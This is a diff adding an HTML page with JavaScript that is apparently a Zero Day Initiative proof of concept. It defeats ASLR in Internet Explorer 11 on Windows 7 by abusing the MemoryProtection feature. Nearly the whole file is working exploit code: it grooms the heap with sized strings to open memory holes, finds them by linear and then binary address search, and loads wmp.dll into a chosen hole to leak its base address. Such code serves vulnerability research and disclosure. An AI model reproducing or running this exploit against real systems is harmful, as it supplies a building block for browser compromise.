@@ -1,0 +1,405 @@
+<!-- 
+     ASLR Bypass using MemoryProtection
+     HP Zero Day Initiative
+ 
+     Target: Windows 7 / IE11 (32-bit process), June 2015 patch level
+     (all patches applied as of 6/15/15)
+
+     Run with heap debug flags OFF
+     Recommended 2GB memory minimum
+-->
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=EDGE"/>
+<meta http-equiv="Expires" content="-1">
+</head>
+<body>
+<script>
+
+function createString(len) {
+	if (len == 0) { return ''; }
+	var s = 'a';
+	while (s.length * 2 <= len) s+=s;
+	if (s.length < len) s+=s.substr(0, len - s.length);
+	return s;
+}
+
+function myCollectGarbage() {
+	var i;
+	var j;
+	var ar;
+	for (j = 0; j < 100; j++) {
+		CollectGarbage();
+		ar = [];
+		for (i = 0; i < 1000; i++) {
+			ar.push(new Object());
+		}
+		ar = null;
+		CollectGarbage();
+	}
+}
+
+// Returns a string length, so that when a string of this length is allocated, the
+// minimum amount of VirtualAlloc'ed memory will be n. n must be a multiple of 0x1000,
+// and it must be at least 0x81000.
+function stringLengthForVirtualAlloc(n) {
+	return (n/2 - 0x14);
+}
+
+var moduleSize = 0xaf4000; // Size of wmp.dll
+var stringOfSizeA = createString(stringLengthForVirtualAlloc(moduleSize));
+var stringToMakeHoleB = createString(stringLengthForVirtualAlloc(moduleSize * 2 - 0x28000));
+var stringToOccupyHoleB = createString(stringLengthForVirtualAlloc(moduleSize + 0x10000));
+var largeBlockSizeString = createString(stringLengthForVirtualAlloc(0x81000));	// String just large enough to fill a large heap block
+var stringToMakeHolesSmallerThanA = createString(stringLengthForVirtualAlloc(Math.min(0x100000, moduleSize - 0x8000)));	// To make holes smaller than A
+var stringToOccupyHolesOfSizeA = createString(stringLengthForVirtualAlloc(moduleSize - 0x10000));	// To fill in unwanted holes of size A or larger
+var stringForMemProtect = createString(100000/2);
+var smallString = createString(0x30);
+var veryLargeString = createString(0x1000000);	// to fill large amounts of memory quickly
+var oDiv1 = document.createElement("div");
+window.oCollection1 = oDiv1.getElementsByClassName(stringToOccupyHoleB);		// priming
+window.oCollection2 = oDiv1.getElementsByClassName(stringOfSizeA);	// priming
+window.oCollection3 = oDiv1.getElementsByClassName(smallString);	// priming
+window.oCollection4 = oDiv1.getElementsByClassName(stringForMemProtect);	// priming
+var testResult;
+var ar1;
+var ar2;
+var bigStringPlaceholder2;
+
+var oCommentForLogMsg = document.createComment('');
+
+function logMsg(code, msg) {
+	Math.atan2(code, oCommentForLogMsg.nodeValue = msg);
+}
+
+function whompStack(depth) {
+	Math.sin(0);
+	var w = whompStack;
+	if (depth > 0) {
+		w(depth - 1);
+	}
+}
+
+function prepareMemory() {
+	var placeholderForHoleA;
+	var placeholderForHoleB;
+	ar1 = new Array();
+	ar2 = new Array();
+	
+	var success = false;
+	
+	myCollectGarbage();
+	oDiv1.getElementsByClassName(smallString);
+	oDiv1.getElementsByClassName(stringForMemProtect);
+	myCollectGarbage();
+	myCollectGarbage();
+	myCollectGarbage();
+
+	for (i = 0; i < 170; i++) ar2.push(document.createTextNode(largeBlockSizeString));
+	for (i = 0; i < 10; i++) {
+		ar1.push(document.createTextNode(stringToMakeHolesSmallerThanA));		// These will be holes smaller than A
+		ar2.push(document.createTextNode(largeBlockSizeString));		// Allocations to prevent holes from coalescing
+	}
+	for (i = 0; i < 40; i++) ar2.push(document.createTextNode(largeBlockSizeString));
+	
+	logMsg(1, "Allocating candidate for hole A");
+	placeholderForHoleA = document.createTextNode(stringOfSizeA);		// This will be hole A
+	
+	for (i = 0; i < 3; i++) ar2.push(document.createTextNode(largeBlockSizeString));
+	ar2.push(document.createTextNode(stringToMakeHoleB));
+	
+	logMsg(2, "Allocating candidate for hole B");
+	placeholderForHoleB = document.createTextNode(stringToMakeHoleB);			// This will be hole B
+
+	for (i = 0; i < 20; i++) ar2.push(document.createTextNode(largeBlockSizeString));
+
+	myCollectGarbage();
+	oDiv1.getElementsByClassName(stringForMemProtect);
+	oDiv1.getElementsByClassName(smallString);
+
+	try {
+		for (i = 0; i < 200; i++) {
+			ar1.push(document.createTextNode(stringToMakeHolesSmallerThanA));	// These will be holes smaller than A
+			ar2.push(document.createTextNode(largeBlockSizeString));	// Allocations to prevent holes from coalescing
+			ar2.push(document.createTextNode(largeBlockSizeString));
+		}
+	}
+	catch (e) {}
+
+	// Open up all the holes smaller than A	
+	for (i in ar1) {
+		ar1[i].nodeValue = '';
+	}
+	ar1 = null;
+
+	// Make sure that there are no holes of size A or larger
+	try {
+		while (true) {
+			ar2.push(document.createTextNode(veryLargeString));
+		}
+	}
+	catch (e) {}
+	for (i = 0; i < 2; i++) {
+		myCollectGarbage();
+		oDiv1.getElementsByClassName(stringForMemProtect);
+		oDiv1.getElementsByClassName(smallString);
+		try {
+			while(true) {
+				ar2.push(document.createTextNode(stringToOccupyHolesOfSizeA));
+			}
+		}
+		catch (e) {}
+	}
+
+	logMsg(3, "Memory fill complete");
+
+	logMsg(0x208, "About to whomp stack");
+
+	whompStack(200 >> 1);
+	
+	logMsg(0x209, "Stack whomp complete");
+
+	// Open up holes A and B
+	placeholderForHoleA.nodeValue = "";
+	placeholderForHoleA = null;
+	placeholderForHoleB.nodeValue = "";
+	placeholderForHoleB = null;
+	myCollectGarbage();
+	oDiv1.getElementsByClassName(stringForMemProtect);
+	oDiv1.getElementsByClassName(smallString);
+	
+	logMsg(0x208, "About to whomp stack");
+
+	whompStack(200 >> 1);
+	
+	logMsg(0x209, "Stack whomp complete");
+
+	logMsg(7, "prepareMemory complete");
+}
+
+function turnOffMemoryPressure() {
+	var i;
+	if (ar1) {
+		for (i in ar1) {
+			ar1[i].nodeValue = '';
+		}
+		ar1 = null;
+	}
+	if (ar2) {
+		for (i in ar2) {
+			ar2[i].nodeValue = '';
+		}
+	}
+	if (bigStringPlaceholder2) {
+		bigStringPlaceholder2.nodeValue = '';
+	}
+	ar1 = null;	
+	ar2 = null;
+	bigStringPlaceholder2 = null;
+	myCollectGarbage();
+}
+
+function breakASLR(resultCallback) {
+	
+	var moduleAddress;
+
+	testOneAddress = function(n) {
+
+		logMsg(0x100, "Starting testOneAddress");
+
+		try {
+			oDiv1.getElementsByClassName(stringToOccupyHoleB);
+		}
+		catch (e) { 
+			logMsg(0x101, "FAILURE: Unable to fill hole B (first fill)");
+			testResult = -1;
+			return;
+		}
+
+		try {
+			oDiv1.getElementsByClassName(stringOfSizeA);
+		}
+		catch (e) {
+			logMsg(0x102, "FAILURE: Unable to fill hole A (first fill)");
+			testResult = -1;
+			return;
+		}
+
+		try {
+			//logMsg(0x106, "Attempting to fill hole B (second fill)...");
+			oDiv1.getElementsByClassName(stringToOccupyHoleB);
+		}
+		catch (e) {
+			logMsg(0x103, "FAILURE: Unable to fill hole B (second fill)");
+			testResult = -1;
+			return;
+		}
+
+		try {
+			//logMsg(0x104, "   Ready to try filling hole A for test...");
+			oDiv1.getElementsByClassName(stringOfSizeA);
+		}
+		catch (e) {
+			logMsg(0x105, "Unable to fill hole A. Test result positive.");
+			testResult = 1;
+			return;
+		}
+		
+		testResult = 0;
+	};
+
+	var trialAddr;
+	var lowerBoundStrict = 0;
+	var upperBound = 0;
+	var success = false;
+
+	prepareMemory();
+
+	// First we do a linear search to find an address within hole A
+	// It will generally fall between these two addresses
+	searchStartAddress = 0x12000020;
+	searchEndAddress = 0x20000020;
+	for (trialAddr = searchStartAddress; trialAddr < searchEndAddress; trialAddr += moduleSize) {
+		// Plant trialAddr on the stack and execute testOneAddress
+		logMsg(0x201, "* Testing address: 0x" + trialAddr.toString(16));
+		testOneAddress(trialAddr >> 1);
+			
+		logMsg(0x208, "About to whomp stack");
+
+		whompStack(200 >> 1);
+		
+		logMsg(0x209, "Stack whomp complete");
+
+		logMsg(0x207, "About to deallocate filled holes");		
+
+		// Ensure that holes A and B are deallocated
+		oDiv1.getElementsByClassName(stringForMemProtect);
+		oDiv1.getElementsByClassName(smallString);
+
+		logMsg(0x208, "About to whomp stack");
+
+		whompStack(200 >> 1);
+
+		logMsg(0x209, "Stack whomp complete");
+
+		if (testResult != 0) break;		// 0 indicates a miss, 1 indicates a hit, -1 indicates failure
+	}
+	if (testResult == 1) {
+
+		// Linear search successfully found an address within hole A.
+		// Now we'll do a binary search to determine the exact start address
+		// of hole A.
+
+		lowerBoundStrict = trialAddr - moduleSize;
+		upperBound = trialAddr;
+		while (true) {
+
+			if (upperBound - lowerBoundStrict < 0x2000
+				|| ((upperBound >> 16) == ((lowerBoundStrict + 0x1000) >> 16))) {
+				// We've narrowed the possible addresses to just one value
+				success = true;
+				break;
+			}
+			
+			//logMsg(0x20a, "Range: 0x" + lowerBoundStrict.toString(16) + " - 0x" + upperBound.toString(16));
+
+			trialAddr = upperBound - Math.round(Math.floor((upperBound - lowerBoundStrict)/0x2000)*0x1000);
+			trialAddrAsString = trialAddr.toString(16);
+
+			// Plant trialAddr on the stack and execute testOneAddress
+			logMsg(0x201, 			"* Testing address: 0x" + trialAddrAsString);
+			testOneAddress(trialAddr >> 1);
+
+			if (testResult == 0) {
+				logMsg(0x202, 		"*         Miss at: 0x" + trialAddrAsString);
+				lowerBoundStrict = trialAddr;
+			}
+			else if (testResult == 1) {
+				logMsg(0x203, 		"*          HIT at: 0x" + trialAddrAsString);
+				upperBound = trialAddr;
+			}
+			else {
+				break;
+			}
+
+			logMsg(0x208, "About to whomp stack");
+
+			whompStack(200 >> 1);
+		
+			logMsg(0x209, "Stack whomp complete");
+
+			logMsg(0x207, "About to deallocate filled holes");		
+
+			// Ensure that holes A and B are deallocated
+			oDiv1.getElementsByClassName(stringForMemProtect);
+			oDiv1.getElementsByClassName(smallString);
+
+			logMsg(0x208, "About to whomp stack");
+
+			whompStack(200 >> 1);
+		
+			logMsg(0x209, "Stack whomp complete");
+		}
+	}
+	
+	if (success) {
+		moduleAddress = upperBound - (upperBound % 0x10000);
+
+		logMsg(0x204, "Hole A located 0x" + moduleAddress.toString(16));
+
+		logMsg(0x208, "About to whomp stack");
+
+		whompStack(200 >> 1);
+	
+		logMsg(0x209, "Stack whomp complete");
+
+		// Ensure that holes A and B are deallocated
+		oDiv1.getElementsByClassName(stringForMemProtect);
+		oDiv1.getElementsByClassName(smallString);
+
+		// Fill hole B
+		bigStringPlaceholder2 = document.createTextNode(stringToOccupyHoleB);
+
+		myCollectGarbage();
+
+		logMsg(0x206, "Ready for module load");
+
+		// Load module into hole A
+		window.module1 = new ActiveXObject("WMPlayer.OCX.7");
+		turnOffMemoryPressure();
+		resultCallback(moduleAddress);
+	}
+	else {
+		turnOffMemoryPressure();
+		resultCallback(0);
+	}
+}
+
+function func1() {
+	for (i = 0; i < 10000000; i++) {}
+	breakASLR(callback1);
+}
+
+function callback1(moduleAddress) {
+	if (moduleAddress) {
+		divOutput.innerText = "Load address of wmp.dll: " + moduleAddress.toString(16);
+	}
+	else {
+		divOutput.innerText = "Failed. Retrying...";
+		window.setTimeout(function() { func2(); }, 1000);
+	}
+}
+
+function func2() {
+		divOutput.innerText = "In progress...";
+		window.setTimeout(function() { func1(); }, 150);
+}
+
+window.setTimeout(func1, 1000);
+
+</script>
+<div id="divOutput" style="-ms-user-select:none;padding: 40px;text-align:center;font:bold 40px monospace">
+	In progress...
+</div>
+</body></html>
